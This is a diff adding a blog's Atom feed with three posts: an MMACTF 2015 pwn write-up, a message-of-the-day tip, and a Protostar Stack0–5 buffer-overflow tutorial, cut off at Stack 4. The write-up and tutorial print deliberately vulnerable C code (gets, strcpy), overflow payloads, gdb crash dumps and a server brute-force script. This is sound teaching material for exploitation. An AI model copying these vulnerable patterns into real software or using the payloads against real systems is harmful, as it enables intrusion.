@@ -1,0 +1,1328 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[punMag]]></title>
+  <link href="http://tungpun.github.io/atom.xml" rel="self"/>
+  <link href="http://tungpun.github.io/"/>
+  <updated>2015-09-09T16:21:59+00:00</updated>
+  <id>http://tungpun.github.io/</id>
+  <author>
+    <name><![CDATA[Tung Pun]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Write Up | MMACTF 2015 - Pwn - RPS]]></title>
+    <link href="http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/"/>
+    <updated>2015-09-09T15:14:40+00:00</updated>
+    <id>http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps</id>
+    <content type="html"><![CDATA[<pre><code>Problem
+Win 50 games in a row!
+nc milkyway.chal.mmactf.link 1641
+</code></pre>
+
+<p><a href="http://assets.score.mmactf.link/attachments/rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e">rps.7z</a></p>
+
+<p>Try to overflow the input, I discover that with payload <code>'1' * 88 + myaddr</code> , I can control the EIP to myaddr</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r &lt; data
+</span><span class='line'>Starting program: /root/MMACTF/rps/rps &lt; data
+</span><span class='line'>What's your name: Hi, 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111114321ABCD
+</span><span class='line'>Let's janken
+</span><span class='line'>Game 1/50
+</span><span class='line'>Rock? Paper? Scissors? [RPS]Bye bye
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>[----------------------------------registers-----------------------------------]
+</span><span class='line'>RAX: 0x0
+</span><span class='line'>RBX: 0x0
+</span><span class='line'>RCX: 0x7ffff7b13f60 (&lt;__write_nocancel+7&gt;:      cmp    rax,0xfffffffffffff001)
+</span><span class='line'>RDX: 0x0
+</span><span class='line'>RSI: 0x7ffff7dd7780 --&gt; 0x0
+</span><span class='line'>RDI: 0x7ffff7dd6620 --&gt; 0xfbad2a84
+</span><span class='line'>RBP: 0x3131313131313131 ('11111111')
+</span><span class='line'>RSP: 0x7fffffffea78 ("4321ABCD")
+</span><span class='line'>RIP: 0x400ae2 (&lt;main+732&gt;:      ret)
+</span><span class='line'>R8 : 0x7ffff7dd7780 --&gt; 0x0
+</span><span class='line'>R9 : 0x7ffff7fed700 (0x00007ffff7fed700)
+</span><span class='line'>R10: 0x355
+</span><span class='line'>R11: 0x246
+</span><span class='line'>R12: 0x400710 (&lt;_start&gt;:        xor    ebp,ebp)
+</span><span class='line'>R13: 0x7fffffffeb50 --&gt; 0x1
+</span><span class='line'>R14: 0x0
+</span><span class='line'>R15: 0x0
+</span><span class='line'>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+</span><span class='line'>[-------------------------------------code-------------------------------------]
+</span><span class='line'>   0x400ad7 &lt;main+721&gt;: call   0x4006e0 &lt;fflush@plt&gt;
+</span><span class='line'>   0x400adc &lt;main+726&gt;: mov    eax,0x0
+</span><span class='line'>   0x400ae1 &lt;main+731&gt;: leave
+</span><span class='line'>=&gt; 0x400ae2 &lt;main+732&gt;: ret
+</span><span class='line'>   0x400ae3:    nop    WORD PTR cs:[rax+rax*1+0x0]
+</span><span class='line'>   0x400aed:    nop    DWORD PTR [rax]
+</span><span class='line'>   0x400af0 &lt;__libc_csu_init&gt;:  push   r15
+</span><span class='line'>   0x400af2 &lt;__libc_csu_init+2&gt;:        mov    r15d,edi
+</span><span class='line'>[------------------------------------stack-------------------------------------]
+</span><span class='line'>0000| 0x7fffffffea78 ("4321ABCD")
+</span><span class='line'>0008| 0x7fffffffea80 --&gt; 0x7fffffffeb00 --&gt; 0x7fffffffeb58 --&gt; 0x7fffffffed88 ("/root/MMACTF/rps/rps")
+</span><span class='line'>0016| 0x7fffffffea88 --&gt; 0x7fffffffeb58 --&gt; 0x7fffffffed88 ("/root/MMACTF/rps/rps")
+</span><span class='line'>0024| 0x7fffffffea90 --&gt; 0x100000000
+</span><span class='line'>0032| 0x7fffffffea98 --&gt; 0x400806 (&lt;main&gt;:      push   rbp)
+</span><span class='line'>0040| 0x7fffffffeaa0 --&gt; 0x0
+</span><span class='line'>0048| 0x7fffffffeaa8 --&gt; 0xe764facb54c92eb8
+</span><span class='line'>0056| 0x7fffffffeab0 --&gt; 0x400710 (&lt;_start&gt;:    xor    ebp,ebp)
+</span><span class='line'>[------------------------------------------------------------------------------]
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x0000000000400ae2 in main ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But, the address of line printing &ldquo;Congrats&rdquo; message contains <strong>\x0a</strong> character.
+It is changed to other character when I push to the program.
+I also try injecting shellcode to postfix, but it doesn&rsquo;t work too.</p>
+
+<blockquote><p>Make it simple !</p></blockquote>
+
+<p>What about rand() ? Is it safe perfectly ?</p>
+
+<p>I pay attention to <code>seed</code> of rand function. Seem like it can be overflowed too :)</p>
+
+<p>Using gdb, i have where the name stored in memory</p>
+
+<p><img src="http://i.imgur.com/VjgdeOA.png" alt="name's address" /></p>
+
+<p>=> <code>$bp-0x50</code></p>
+
+<p>And <code>...seed</code></p>
+
+<p><img src="http://i.imgur.com/j93EyWq.png" alt="seed's address" /></p>
+
+<p>=> <code>$bp-0x20</code></p>
+
+<p>Calculate the length of payload:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0x50 - 0x20 = 0x30 ~ 48</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>seed = 'AAAA'
+</span><span class='line'>payload = 'A' * 48 + seed</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Keep the <code>seed</code>, we try to brute force the result.
+I use this code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/env python 2.7
+</span><span class='line'>
+</span><span class='line'>import socket
+</span><span class='line'>import telnetlib
+</span><span class='line'>import struct
+</span><span class='line'>
+</span><span class='line'>p = lambda x: struct.pack("I", x)
+</span><span class='line'>P = lambda x: struct.unpack("I", x)
+</span><span class='line'>q = lambda x: struct.pack("&lt;Q", x)
+</span><span class='line'>
+</span><span class='line'>def interact():
+</span><span class='line'>    t = telnetlib.Telnet()
+</span><span class='line'>    t.sock = s
+</span><span class='line'>    t.interact()
+</span><span class='line'>
+</span><span class='line'>def r_until(st, debug=False):
+</span><span class='line'>    ret = ""
+</span><span class='line'>    while st not in ret:
+</span><span class='line'>        lret = s.recv(8192)
+</span><span class='line'>        if debug and len(lret) &gt; 0:
+</span><span class='line'>            print lret
+</span><span class='line'>        ret += lret
+</span><span class='line'>    return ret
+</span><span class='line'>
+</span><span class='line'>def tryluck(s, c):
+</span><span class='line'>    s.send(c + '\n')
+</span><span class='line'>    result = s.recv(1024)    
+</span><span class='line'>    if 'win' in result:
+</span><span class='line'>        return True
+</span><span class='line'>    return False
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    correctAnswer = []
+</span><span class='line'>    guessAnswer = 0                                     # 0 for R, 1 for P, 2 for S 
+</span><span class='line'>    for sessionID in range(0, 1000):        
+</span><span class='line'>        s = socket.create_connection(('milkyway.chal.mmactf.link', '1641'))
+</span><span class='line'>        print r_until(':')
+</span><span class='line'>        name = "A" * 52                                 # 48 + 4    
+</span><span class='line'>        s.send(name + '\n')            
+</span><span class='line'>        gameID = 0    
+</span><span class='line'>        while True:          
+</span><span class='line'>            print '[+] sessionID:', sessionID, '        gameID:', (gameID+1)
+</span><span class='line'>            print '[+] correctAnswer', correctAnswer                        
+</span><span class='line'>            print r_until(']', debug=True)
+</span><span class='line'>
+</span><span class='line'>            if gameID + 1 &lt;= len(correctAnswer):        # I have saved result for this game
+</span><span class='line'>                s.send(correctAnswer[gameID] + '\n')
+</span><span class='line'>                result = s.recv(1024)
+</span><span class='line'>                print '[+] Result:', result            
+</span><span class='line'>            else:                                       # no result for this game exists
+</span><span class='line'>                if guessAnswer == 0:
+</span><span class='line'>                    answer = 'S'
+</span><span class='line'>                elif guessAnswer == 1:
+</span><span class='line'>                    answer = 'R'
+</span><span class='line'>                else:
+</span><span class='line'>                    answer = 'P'
+</span><span class='line'>
+</span><span class='line'>                if not tryluck(s, answer):
+</span><span class='line'>                    guessAnswer += 1                    # choose another answer
+</span><span class='line'>                    break     
+</span><span class='line'>
+</span><span class='line'>                correctAnswer.append(answer)            # win, record the answer
+</span><span class='line'>                guessAnswer = 0                                                        
+</span><span class='line'>
+</span><span class='line'>            gameID += 1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Get flag: <code>MMA{treed_three_girls}</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Have Fun With Linux - Configure Welcome Message]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/11/have-fun-with-linux-configure-welcome-message/"/>
+    <updated>2015-08-11T18:53:19+00:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/11/have-fun-with-linux-configure-welcome-message</id>
+    <content type="html"><![CDATA[<p>Have you ever felt boring with your linux server&rsquo;s default message ?
+Do you wanna something like:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>
+</span><span class='line'>                              *********                                       
+</span><span class='line'>                         *******      **                                      
+</span><span class='line'>                    *****              **                                     
+</span><span class='line'>               ******       ****        **                                    
+</span><span class='line'>             ****    *                 ***                                    
+</span><span class='line'>           ****              ***   ***     **                                 
+</span><span class='line'>        * ***** ******                      **            ***                 
+</span><span class='line'>       ***            **********      ****   ***         ****                 
+</span><span class='line'>       **                     ****             **       **  *         ********
+</span><span class='line'>         ***                      ***      **  **      **** ***            ***
+</span><span class='line'>         *                           *****    ****   ***    ********          
+</span><span class='line'>         *****                          ***     ***  ***   *** **             
+</span><span class='line'>           **   ******** ***********    ** ***   **  **       **   ****       
+</span><span class='line'>            ****                       **    ***  *  *** *****   *********    
+</span><span class='line'>             **                        **     *****   ***       **************
+</span><span class='line'>            **                        ***    **** *     ****   ***************
+</span><span class='line'>            **                        *        *      *****         **********
+</span><span class='line'>             **                      **     *** *****   **********************
+</span><span class='line'>              **                    **      **   ***********                 *
+</span><span class='line'>                *****              ***  ****               **            *   *
+</span><span class='line'>                     **************   *                     **          ******
+</span><span class='line'>                         **   *******                        ***** ******* ***
+</span><span class='line'>                        **  **************                       *************
+</span><span class='line'>                       ***  * ****** **  **                      *************
+</span><span class='line'>                       **   *******   *****                     **************
+</span><span class='line'>                       **   ** ** ********                     ******* * *****
+</span><span class='line'>                      ******************                       *  ****  ******
+</span><span class='line'>     #TungPun          *****   *******                         ********** ****
+</span><span class='line'>                      **       **   **                         ** ************
+</span><span class='line'> *  *  *  *  ** ** *****************************  **** ***********************
+</span><span class='line'>                   *       ***   **      *************************************
+</span><span class='line'>      **                                 *        **  **** ********** ********
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>:::::::::  :::    ::: ::::    :::     :::     :::::::::   ::::::::  :::    :::
+</span><span class='line'>:+:    :+: :+:    :+: :+:+:   :+:   :+: :+:   :+:    :+: :+:    :+: :+:    :+:
+</span><span class='line'>+:+    +:+ +:+    +:+ :+:+:+  +:+  +:+   +:+  +:+    +:+ +:+        +:+    +:+
+</span><span class='line'>+#++:++#+  +#+    +:+ +#+ +:+ +#+ +#++:++#++: +#++:++#:  +#+        +#++:++#++
+</span><span class='line'>+#+        +#+    +#+ +#+  +#+#+# +#+     +#+ +#+    +#+ +#+        +#+    +#+
+</span><span class='line'>#+#        #+#    #+# #+#   #+#+# #+#     #+# #+#    #+# #+#    #+# #+#    #+#
+</span><span class='line'>###         ########  ###    #### ###     ### ###    ###  ########  ###    ###
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Prepare a ascii art which you like then echo it to <code>/etc/motd</code> (message of the day).
+All done~ Restart your session and enjoy :D</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hello Pwnable, Protostar Stack0~5]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/11/hello-pwnable/"/>
+    <updated>2015-08-11T11:53:34+00:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/11/hello-pwnable</id>
+    <content type="html"><![CDATA[<p>On my summer holiday, I have spent a couple of day to learn pwnable at  <a href="https://exploit-exercises.com/protostar/">protostar</a> where has interesting challenges. With newbie, i believe that if you try to follow from Stack 0 to Stack 5 (i wanna more, but now i haven&rsquo;t finished all of them), you will got steady base about Stack and have plan to dig deeper for the Buffer over Flow technique in the future.</p>
+
+<p>After reading my previous articles, you know my English is too terrible. I will try with my best, and blogging is one of my efforts to improve my English.</p>
+
+<p>Here we go,</p>
+
+<h2>STACK 0</h2>
+
+<p>This is the first (easiest, too) level. They&rsquo;ve given us a piece of code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack0.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int modified;
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  modified = 0;
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>
+</span><span class='line'>  if(modified != 0) {
+</span><span class='line'>      printf("you have changed the 'modified' variable\n");
+</span><span class='line'>  } else {
+</span><span class='line'>      printf("Try again?\n");
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our goal is modify <strong>modified</strong>&rsquo;s value through <strong>gets(buffer)</strong> function. &ldquo;Sound fabulous, how can i change this variable&rsquo;s value when i cant touch it ?&rdquo;. However, when you use <a href="http://www.gnu.org/software/gdb/">gdb</a> to debug that file, you will recognize that <strong>buffer</strong>&rsquo;s address is just below <strong>modified</strong>&rsquo;s address in STACK. So, if we overload the <strong>buffer</strong>, the leftover will overwrite <strong>modified</strong> => the payload we need in this level is a string contains 70 * <strong>A</strong> (try more if you want).</p>
+
+<h2>STACK 1</h2>
+
+<p>In this challenge, we have a code which is much the same as previous one.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack1.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int modified;
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  if(argc == 1) {
+</span><span class='line'>      errx(1, "please specify an argument\n");
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  modified = 0;
+</span><span class='line'>  strcpy(buffer, argv[1]);
+</span><span class='line'>
+</span><span class='line'>  if(modified == 0x61626364) {
+</span><span class='line'>      printf("you have correctly got the variable to the right value\n");
+</span><span class='line'>  } else {
+</span><span class='line'>      printf("Try again, you got 0x%08x\n", modified);
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not only overload <strong>buffer</strong>, we need make <strong>modified</strong>&rsquo;s value same as <strong>0x61626364</strong> (equal to <strong>dcba</strong> in ascii).
+Cuz the execute environment belongs to Little Endiance system, so you must <strong>pack(&lsquo;&lt;I&rsquo;, targetvalue)</strong></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = 64 * 'A' + pack('&lt;I", '0x61626364')
+</span><span class='line'>        = 64 * 'A' + '\x64\x63\x62\x61'</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>STACK 2</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack2.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int modified;
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>  char *variable;
+</span><span class='line'>
+</span><span class='line'>  variable = getenv("GREENIE");
+</span><span class='line'>
+</span><span class='line'>  if(variable == NULL) {
+</span><span class='line'>      errx(1, "please set the GREENIE environment variable\n");
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  modified = 0;
+</span><span class='line'>
+</span><span class='line'>  strcpy(buffer, variable);
+</span><span class='line'>
+</span><span class='line'>  if(modified == 0x0d0a0d0a) {
+</span><span class='line'>      printf("you have correctly modified the variable\n");
+</span><span class='line'>  } else {
+</span><span class='line'>      printf("Try again, you got 0x%08x\n", modified);
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Instead of reading buffer from keyboard, this level require <code>GREENIE</code> environment variable. We use <code>export</code> command in Linux</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  GREENIE=`python2 -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`
+</span><span class='line'>➜  export GREENIE
+</span><span class='line'>➜  ./stack2
+</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>STACK 3</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack3.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>void win()
+</span><span class='line'>{
+</span><span class='line'>  printf("code flow successfully changed\n");
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int (*fp)();
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  fp = 0;
+</span><span class='line'>
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>
+</span><span class='line'>  if(fp) {
+</span><span class='line'>      printf("calling function pointer, jumping to 0x%08x\n", fp);
+</span><span class='line'>      fp();
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the end of this piece of code, the program call the function which has address stored in <code>fp</code> &rsquo;s value. So, how to force the program to call <code>win</code> function ? The first thought is overwrite <code>win</code> &rsquo;s address to <code>fp</code> value.</p>
+
+<p>But, what is <code>win</code>&rsquo;s address ?</p>
+
+<p>Using gdb (with <a href="https://github.com/longld/peda">peda</a>) we have:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb -q stack3
+</span><span class='line'>Reading symbols from stack3...done.
+</span><span class='line'>gdb-peda$ disass win
+</span><span class='line'>Dump of assembler code for function win:
+</span><span class='line'>   0x08048424 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x08048425 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x08048427 &lt;+3&gt;:     sub    esp,0x18
+</span><span class='line'>   0x0804842a &lt;+6&gt;:     mov    DWORD PTR [esp],0x8048540
+</span><span class='line'>   0x08048431 &lt;+13&gt;:    call   0x8048360 &lt;puts@plt&gt;
+</span><span class='line'>   0x08048436 &lt;+18&gt;:    leave
+</span><span class='line'>   0x08048437 &lt;+19&gt;:    ret
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So <code>win</code> &rsquo;s address is <code>0x08048424</code>. Now, we will build a payload, which contains 64 &lsquo;A&rsquo; characters and <code>0x08048424</code> in Little Endiance.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  python2 -c 'print "A" * 64 + "\x24\x84\x04\x08"' &gt; input3.b
+</span><span class='line'>➜  ./stack3 &lt; input3.b
+</span><span class='line'>calling function pointer, jumping to 0x08048424
+</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>STACK 4</h2>
+
